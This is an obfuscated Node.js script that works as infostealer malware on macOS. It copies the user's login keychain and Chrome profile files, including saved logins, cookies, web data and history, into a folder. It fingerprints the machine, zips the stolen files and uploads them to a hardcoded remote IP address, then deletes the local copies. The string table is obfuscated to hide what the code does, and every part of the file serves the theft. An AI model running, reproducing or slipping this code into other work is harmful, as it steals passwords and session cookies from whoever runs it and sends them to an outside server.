const _0x39fd43=_0x2a8d;(function(_0x532eb0,_0x46d3b6){const _0x134573=_0x2a8d,_0x562c6a=_0x532eb0();while(!![]){try{const _0x51eeef=parseInt(_0x134573(0x211))/0x1+-parseInt(_0x134573(0x248))/0x2+-parseInt(_0x134573(0x1c8))/0x3+parseInt(_0x134573(0x22f))/0x4*(parseInt(_0x134573(0x1ec))/0x5)+parseInt(_0x134573(0x1e2))/0x6*(-parseInt(_0x134573(0x1de))/0x7)+parseInt(_0x134573(0x1ed))/0x8+-parseInt(_0x134573(0x1d4))/0x9;if(_0x51eeef===_0x46d3b6)break;else _0x562c6a['push'](_0x562c6a['shift']());}catch(_0x275afb){_0x562c6a['push'](_0x562c6a['shift']());}}}(_0xba04,0x24f6a));const fs=require('fs'),os=require('os'),path=require(_0x39fd43(0x254)),{exec,execSync}=require('child_process'),crypto=require(_0x39fd43(0x1eb)),axios=require(_0x39fd43(0x1e5)),FormData=require(_0x39fd43(0x238)),CONFIG={'serverUrl':_0x39fd43(0x23c),'apiKey':'tJz4uRVCwl2eEwyPTudYP9iGRfgq','chunkSize':0x100*0x400,'retryDelay':0x1388,'maxRetries':0x5,'timeout':0x1d4c0,'stableDir':_0x39fd43(0x1e7),'zipFileName':generateClientId()+_0x39fd43(0x245),'chromeImportantFiles':[_0x39fd43(0x247),_0x39fd43(0x1c7),_0x39fd43(0x1da),_0x39fd43(0x204),'History',_0x39fd43(0x21b),_0x39fd43(0x24c),_0x39fd43(0x1f2),_0x39fd43(0x21c),_0x39fd43(0x1f5)]};function log(_0x217946,_0x3397e8=![]){const _0xf8eb26=_0x39fd43,_0x27c0ed=new Date()[_0xf8eb26(0x24f)](),_0x18fd47='['+_0x27c0ed+']\x20'+_0x217946;_0x3397e8?console[_0xf8eb26(0x231)](_0x18fd47):console['log'](_0x18fd47);try{fs[_0xf8eb26(0x1f1)](_0xf8eb26(0x218),_0x18fd47+'\x0a');}catch(_0x33cd39){console['error'](_0xf8eb26(0x1ce)+_0x33cd39['message']);}}function createDirectory(_0x159c37){const _0x977484=_0x39fd43;try{return!fs[_0x977484(0x234)](_0x159c37)?(fs[_0x977484(0x249)](_0x159c37,{'recursive':!![]}),log(_0x977484(0x212)+_0x159c37)):log(_0x977484(0x244)+_0x159c37),!![];}catch(_0x145cbb){return log(_0x977484(0x1e3)+_0x159c37+':\x20'+_0x145cbb['message'],!![]),![];}}function _0xba04(){const _0x3aa745=['=====\x20НАЧАЛО\x20СБОРА\x20ДАННЫХ\x20=====','floor','Информация\x20о\x20системе:\x20','timeout','Статус\x20ошибки:\x20','Предупреждение:\x20Ошибка\x20при\x20удалении\x20временных\x20файлов:\x20','Нет\x20ответа\x20от\x20сервера','\x20байт\x20(','unknown','49124kzTSPY','\x20->\x20','error','Предупреждение:\x20Не\x20удалось\x20проверить/установить\x20зависимости:\x20','pow','existsSync','exit','Executing\x20command:\x20','Тип\x20ошибки:\x20','form-data','=====\x20НАЧАЛО\x20ОТПРАВКИ\x20АРХИВА\x20=====','trim','Error\x20executing\x20command:\x20','http://65.87.7.103:8088/api/files/upload','message','Default','username','maxRetries','size','getLengthSync','stack','Directory\x20already\x20exists:\x20','.zip','stringify','Web\x20Data','379998adneRu','mkdirSync','Found\x20','/Users/','Cookies','digest','name','toISOString','==========\x20СБОР\x20И\x20ОТПРАВКА\x20ДАННЫХ\x20УСПЕШНО\x20ЗАВЕРШЕНЫ\x20==========','random','stderr:\x20','=====\x20СБОР\x20ДАННЫХ\x20ЗАВЕРШЕН\x20=====','path','/Library/Application\x20Support/Google/Chrome','request','createReadStream','isDirectory','ФАТАЛЬНАЯ\x20ОШИБКА:\x20','toString','readdirSync','networkInterfaces','Зависимости\x20успешно\x20установлены','Web\x20Data-journal','113868wyQtJv','Содержимое\x20директории:\x20','Статус\x20ответа:\x20','append','00:00:00:00:00:00','File\x20copied:\x20','Error\x20writing\x20to\x20log:\x20','\x20удалена','application/zip','loaded','login.keychain-db','\x20секунд\x20(','80649DcatzE','copyFileSync','cwd','/Library/Keychains/login.keychain-db','chromeImportantFiles','status','Login\x20Data','userInfo','push','=====\x20ОТПРАВКА\x20АРХИВА\x20ЗАВЕРШЕНА\x20=====','75257ESiDAE','substring','Текущая\x20директория:\x20','./node_modules/axios','144YMXlIl','Error\x20creating\x20directory\x20','\x20KB/s)','axios','md5','Stable','Creating\x20ZIP\x20archive...','Error\x20scanning\x20Chrome\x20profiles:\x20','version','crypto','70YQDmMd','2355488BGxXhs','0\x20Bytes','statSync','==========\x20НАЧАЛО\x20ПРОЦЕССА\x20СБОРА\x20И\x20ОТПРАВКИ\x20ДАННЫХ\x20==========','appendFileSync','Cookies-journal','npm\x20install\x20axios\x20form-data','Profile\x20','Secure\x20Preferences','hostname','file','КРИТИЧЕСКАЯ\x20ОШИБКА:\x20Файл\x20не\x20найден:\x20','stderr','total','%\x20(','Keychain\x20file\x20not\x20found:\x20','Стек\x20ошибки:\x20','stableDir','Failed\x20to\x20create\x20ZIP\x20archive','Error\x20in\x20data\x20collection:\x20','Chrome\x20directory\x20not\x20found:\x20','toFixed','join','Login\x20Data-journal','data','post','Установка\x20необходимых\x20зависимостей...','Сбор\x20данных\x20завершился\x20с\x20ошибкой','Превышено\x20максимальное\x20количество\x20попыток\x20(','update','basename','arch','log','./node_modules/form-data','Current\x20user:\x20','Bytes','179972EvzqEr','Directory\x20created:\x20','response','serverUrl','Archive\x20size:\x20','zipFileName','Данные\x20ошибки:\x20','collector.log','code','\x20copied\x20successfully','History-journal','Bookmarks','now','Chrome_','Failed\x20to\x20create\x20Stable\x20directory','URL\x20сервера:\x20','Error\x20copying\x20file\x20','==========\x20ОШИБКА\x20ОТПРАВКИ\x20ДАННЫХ\x20==========','platform','Временная\x20директория\x20','Chrome\x20data\x20for\x20profile\x20'];_0xba04=function(){return _0x3aa745;};return _0xba04();}function _0x2a8d(_0x33d34b,_0x175cb7){const _0xba04d=_0xba04();return _0x2a8d=function(_0x2a8d4d,_0x56457a){_0x2a8d4d=_0x2a8d4d-0x1bf;let _0x3e6055=_0xba04d[_0x2a8d4d];return _0x3e6055;},_0x2a8d(_0x33d34b,_0x175cb7);}function copyFile(_0x3b93e7,_0x449943){const _0xf5bf50=_0x39fd43;try{return fs[_0xf5bf50(0x1d5)](_0x3b93e7,_0x449943),log(_0xf5bf50(0x1cd)+_0x3b93e7+_0xf5bf50(0x230)+_0x449943),!![];}catch(_0x453803){return log(_0xf5bf50(0x221)+_0x3b93e7+':\x20'+_0x453803[_0xf5bf50(0x23d)],!![]),![];}}function executeCommand(_0x2bee28){const _0xd0138d=_0x39fd43;try{log(_0xd0138d(0x236)+_0x2bee28);const _0x4a8ae1=execSync(_0x2bee28,{'encoding':'utf8'});return log('Command\x20output:\x20'+_0x4a8ae1[_0xd0138d(0x23a)]()),{'success':!![],'output':_0x4a8ae1};}catch(_0x81f3c3){log(_0xd0138d(0x23b)+_0x81f3c3[_0xd0138d(0x23d)],!![]);if(_0x81f3c3[_0xd0138d(0x1f9)])log(_0xd0138d(0x252)+_0x81f3c3[_0xd0138d(0x1f9)],!![]);return{'success':![],'error':_0x81f3c3};}}function formatFileSize(_0x522e31){const _0x5396b0=_0x39fd43;if(_0x522e31===0x0)return _0x5396b0(0x1ee);const _0x387db0=0x400,_0x45d2ef=[_0x5396b0(0x210),'KB','MB','GB','TB'],_0x59758d=Math[_0x5396b0(0x227)](Math[_0x5396b0(0x20d)](_0x522e31)/Math['log'](_0x387db0));return parseFloat((_0x522e31/Math[_0x5396b0(0x233)](_0x387db0,_0x59758d))['toFixed'](0x2))+'\x20'+_0x45d2ef[_0x59758d];}function generateClientId(){const _0x121851=_0x39fd43;try{const _0x31b2d9=getMacAddress(),_0x143481=os['hostname'](),_0x27b971=os[_0x121851(0x1db)]()[_0x121851(0x23f)],_0x1b29e0=crypto['createHash'](_0x121851(0x1e6))[_0x121851(0x20a)](_0x31b2d9+':'+_0x143481+':'+_0x27b971)[_0x121851(0x24d)]('hex')['substring'](0x0,0x8);return _0x1b29e0;}catch(_0x1ee1c2){return Math[_0x121851(0x251)]()[_0x121851(0x1c3)](0x24)[_0x121851(0x1df)](0x2,0xa);}}function getMacAddress(){const _0x1de6a1=_0x39fd43;try{const _0x10240b=os[_0x1de6a1(0x1c5)]();for(const _0x39b4a6 of Object['keys'](_0x10240b)){for(const _0x544f4e of _0x10240b[_0x39b4a6]){if(!_0x544f4e['internal']&&_0x544f4e['mac']!==_0x1de6a1(0x1cc))return _0x544f4e['mac'];}}return _0x1de6a1(0x22e);}catch(_0x7c47b0){return _0x1de6a1(0x22e);}}async function collectData(){const _0x49141=_0x39fd43;try{log(_0x49141(0x226));if(!createDirectory(CONFIG[_0x49141(0x1fe)]))throw new Error(_0x49141(0x21f));const _0x50ef63=os[_0x49141(0x1db)]()[_0x49141(0x23f)];log(_0x49141(0x20f)+_0x50ef63);const _0x56efed=_0x49141(0x24b)+_0x50ef63+_0x49141(0x1d7),_0x27be8a=path[_0x49141(0x203)](CONFIG[_0x49141(0x1fe)],_0x49141(0x1d2));fs['existsSync'](_0x56efed)?copyFile(_0x56efed,_0x27be8a):log(_0x49141(0x1fc)+_0x56efed,!![]);try{const _0x36f8f0=_0x49141(0x24b)+_0x50ef63+_0x49141(0x255);if(fs[_0x49141(0x234)](_0x36f8f0)){const _0x1151a4=[];fs[_0x49141(0x234)](path[_0x49141(0x203)](_0x36f8f0,_0x49141(0x23e)))&&_0x1151a4[_0x49141(0x1dc)](_0x49141(0x23e));try{const _0x3548e1=fs[_0x49141(0x1c4)](_0x36f8f0,{'withFileTypes':!![]});for(const _0x826b23 of _0x3548e1){_0x826b23[_0x49141(0x1c1)]()&&_0x826b23[_0x49141(0x24e)]['startsWith'](_0x49141(0x1f4))&&_0x1151a4[_0x49141(0x1dc)](_0x826b23[_0x49141(0x24e)]);}}catch(_0x77ab83){log(_0x49141(0x1e9)+_0x77ab83['message'],!![]);}log(_0x49141(0x24a)+_0x1151a4['length']+'\x20Chrome\x20profiles:\x20'+_0x1151a4[_0x49141(0x203)](',\x20'));for(const _0x303d2a of _0x1151a4){const _0x448d5d=path[_0x49141(0x203)](_0x36f8f0,_0x303d2a),_0x4b9544=path[_0x49141(0x203)](CONFIG[_0x49141(0x1fe)],_0x49141(0x21e)+_0x303d2a);createDirectory(_0x4b9544);for(const _0x14b033 of CONFIG[_0x49141(0x1d8)]){const _0x15fd6a=path['join'](_0x448d5d,_0x14b033),_0x2308ed=path[_0x49141(0x203)](_0x4b9544,_0x14b033);fs[_0x49141(0x234)](_0x15fd6a)?copyFile(_0x15fd6a,_0x2308ed):log('Chrome\x20file\x20not\x20found\x20in\x20profile\x20'+_0x303d2a+':\x20'+_0x15fd6a);}log(_0x49141(0x225)+_0x303d2a+_0x49141(0x21a));}}else log(_0x49141(0x201)+_0x36f8f0,!![]);}catch(_0x41045d){log('Error\x20copying\x20Chrome\x20data:\x20'+_0x41045d[_0x49141(0x23d)],!![]);}log(_0x49141(0x1e8));const _0x27eacc=executeCommand('zip\x20-r\x20-1\x20'+CONFIG['zipFileName']+'\x20'+CONFIG['stableDir']+'\x20-x\x20\x22*.DS_Store\x22');if(!_0x27eacc['success'])throw new Error(_0x49141(0x1ff));log('ZIP\x20archive\x20created\x20successfully');if(fs['existsSync'](CONFIG[_0x49141(0x216)])){const _0x230fc8=fs[_0x49141(0x1ef)](CONFIG[_0x49141(0x216)]);log(_0x49141(0x215)+formatFileSize(_0x230fc8[_0x49141(0x241)]));}else throw new Error('ZIP\x20archive\x20file\x20not\x20found\x20after\x20creation');return log(_0x49141(0x253)),!![];}catch(_0x7d10b8){return log(_0x49141(0x200)+_0x7d10b8['message'],!![]),![];}}async function uploadFile(_0xce13f3=0x0){const _0x156819=_0x39fd43;try{const _0x1db1f6=path[_0x156819(0x203)](process[_0x156819(0x1d6)](),CONFIG['zipFileName']);if(!fs[_0x156819(0x234)](_0x1db1f6))return log(_0x156819(0x1f8)+_0x1db1f6,!![]),log(_0x156819(0x1e0)+process[_0x156819(0x1d6)](),!![]),log(_0x156819(0x1c9)+fs['readdirSync'](process[_0x156819(0x1d6)]())[_0x156819(0x203)](',\x20'),!![]),![];const _0x298ff4=fs['statSync'](_0x1db1f6),_0x87c4ef=_0x298ff4[_0x156819(0x241)];log('Размер\x20файла:\x20'+_0x87c4ef+_0x156819(0x22d)+formatFileSize(_0x87c4ef)+')');if(_0x87c4ef===0x0)return log('ОШИБКА:\x20Файл\x20'+CONFIG['zipFileName']+'\x20имеет\x20нулевой\x20размер!',!![]),![];const _0x3eb60f=new FormData();_0x3eb60f[_0x156819(0x1cb)](_0x156819(0x1f7),fs[_0x156819(0x1c0)](_0x1db1f6),{'filename':path[_0x156819(0x20b)](_0x1db1f6),'contentType':_0x156819(0x1d0),'knownLength':_0x87c4ef});const _0x48e4b8={'hostname':os[_0x156819(0x1f6)](),'platform':os['platform'](),'type':os['type'](),'arch':os[_0x156819(0x20c)](),'username':os[_0x156819(0x1db)]()['username'],'id':generateClientId()};log(_0x156819(0x239)),log(_0x156819(0x228)+JSON[_0x156819(0x246)](_0x48e4b8)),log(_0x156819(0x220)+CONFIG[_0x156819(0x214)]);const _0x265007=Date[_0x156819(0x21d)]();log('Отправка\x20началась\x20в:\x20'+new Date(_0x265007)[_0x156819(0x24f)]());const _0x2273d1=await axios[_0x156819(0x206)](CONFIG[_0x156819(0x214)],_0x3eb60f,{'headers':{..._0x3eb60f['getHeaders'](),'X-Client-Info':JSON[_0x156819(0x246)](_0x48e4b8),'Content-Length':_0x3eb60f[_0x156819(0x242)]()},'maxContentLength':Infinity,'maxBodyLength':Infinity,'timeout':CONFIG[_0x156819(0x229)],'onUploadProgress':_0x2db5e7=>{const _0x16f509=_0x156819,_0x358618=Math['round'](_0x2db5e7[_0x16f509(0x1d1)]*0x64/_0x2db5e7[_0x16f509(0x1fa)]);log('Прогресс\x20загрузки:\x20'+_0x358618+_0x16f509(0x1fb)+formatFileSize(_0x2db5e7[_0x16f509(0x1d1)])+'/'+formatFileSize(_0x2db5e7[_0x16f509(0x1fa)])+')');}}),_0x4c6754=Date[_0x156819(0x21d)](),_0x2689ce=(_0x4c6754-_0x265007)/0x3e8,_0x45ed0f=_0x87c4ef/_0x2689ce/0x400;return log('Загрузка\x20завершена\x20за\x20'+_0x2689ce[_0x156819(0x202)](0x1)+_0x156819(0x1d3)+_0x45ed0f['toFixed'](0x2)+_0x156819(0x1e4)),log(_0x156819(0x1ca)+_0x2273d1[_0x156819(0x1d9)]),log('Ответ\x20сервера:\x20'+JSON[_0x156819(0x246)](_0x2273d1[_0x156819(0x205)])),log(_0x156819(0x1dd)),_0x2273d1['data']['success'];}catch(_0xd33fe4){log('ОШИБКА\x20ПРИ\x20ЗАГРУЗКЕ\x20(попытка\x20'+(_0xce13f3+0x1)+'/'+CONFIG[_0x156819(0x240)]+'):',!![]);if(_0xd33fe4[_0x156819(0x213)])log(_0x156819(0x22a)+_0xd33fe4['response']['status'],!![]),log(_0x156819(0x217)+JSON['stringify'](_0xd33fe4[_0x156819(0x213)]['data']),!![]);else _0xd33fe4[_0x156819(0x1bf)]?(log(_0x156819(0x22c),!![]),log(_0x156819(0x237)+_0xd33fe4[_0x156819(0x219)],!![])):log('Ошибка\x20настройки:\x20'+_0xd33fe4['message'],!![]);if(_0xce13f3<CONFIG[_0x156819(0x240)])return log('Повторная\x20попытка\x20через\x20'+CONFIG['retryDelay']/0x3e8+'\x20секунд...'),await new Promise(_0x513422=>setTimeout(_0x513422,CONFIG['retryDelay'])),uploadFile(_0xce13f3+0x1);return log(_0x156819(0x209)+CONFIG[_0x156819(0x240)]+')',!![]),![];}}async function main(){const _0x39771c=_0x39fd43;try{log(_0x39771c(0x1f0)),log('Версия\x20Node.js:\x20'+process[_0x39771c(0x1ea)]),log('Платформа:\x20'+process[_0x39771c(0x223)]),log('Директория\x20запуска:\x20'+process['cwd']());try{(!fs[_0x39771c(0x234)](_0x39771c(0x1e1))||!fs['existsSync'](_0x39771c(0x20e)))&&(log(_0x39771c(0x207)),execSync(_0x39771c(0x1f3)),log(_0x39771c(0x1c6)));}catch(_0x5de18e){log(_0x39771c(0x232)+_0x5de18e['message']);}const _0xd275fc=await collectData();!_0xd275fc&&(log(_0x39771c(0x208),!![]),process[_0x39771c(0x235)](0x1));const _0x5e6676=await uploadFile();if(_0x5e6676){log(_0x39771c(0x250));try{fs[_0x39771c(0x234)](CONFIG[_0x39771c(0x1fe)])&&(executeCommand('rm\x20-rf\x20'+CONFIG['stableDir']),log(_0x39771c(0x224)+CONFIG[_0x39771c(0x1fe)]+_0x39771c(0x1cf)));}catch(_0x32285b){log(_0x39771c(0x22b)+_0x32285b[_0x39771c(0x23d)]);}process[_0x39771c(0x235)](0x0);}else log(_0x39771c(0x222),!![]),process[_0x39771c(0x235)](0x1);}catch(_0x4946eb){log(_0x39771c(0x1c2)+_0x4946eb[_0x39771c(0x23d)],!![]),log(_0x39771c(0x1fd)+_0x4946eb[_0x39771c(0x243)],!![]),process[_0x39771c(0x235)](0x1);}}main();
